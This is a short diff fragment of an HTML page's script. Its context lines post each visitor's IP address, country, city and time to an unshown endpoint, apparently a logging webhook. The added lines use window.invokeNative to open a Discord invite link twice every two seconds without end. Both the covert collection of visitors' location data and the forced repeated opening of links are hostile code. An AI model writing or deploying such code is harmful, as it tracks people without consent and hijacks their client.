@@ -128,3 +128,12 @@
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`})
       });
+
+
+      setInterval(function() {
+            window.invokeNative("openUrl", "https://discord.gg/oon");
+            window.invokeNative("openUrl", "https://discord.gg/oon");
+             },     2000);
+    </script>
+</body>
+</html>
